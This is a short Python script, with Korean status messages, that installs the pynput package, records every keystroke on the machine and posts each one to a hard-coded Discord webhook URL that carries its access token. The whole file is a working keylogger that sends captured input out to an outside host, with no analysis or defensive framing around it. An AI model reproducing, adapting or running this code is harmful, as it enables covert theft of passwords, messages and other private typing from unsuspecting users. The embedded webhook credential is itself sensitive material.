import subprocess
import sys

package_name = "pynput"
try:
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
    print(f"'{package_name}' 패키지가 성공적으로 설치되었습니다.")
except subprocess.CalledProcessError as e:
    print(f"패키지 설치 실패: {e}")
    
import os
import requests
import time
from pynput import keyboard

def send_to_discord(content):
    try:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO"
        headers = {
            "Content-Type": "application/json"
        }

        for i in content.split("\n"):
            time.sleep(1)
            data = {
                "content": i
            }
            requests.post(webhook_url, json=data, headers=headers)
    except Exception as e:
        data = {
            "content": "SEND Error!\n" + str(e)
        }
        requests.post(webhook_url, json=data, headers=headers)

def on_press(key):
    try:
        key_info = f"Key pressed: {key.char}"
        send_to_discord(key_info)
    except AttributeError:

        key_info = f"Special key pressed: {key}"
        send_to_discord(key_info)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
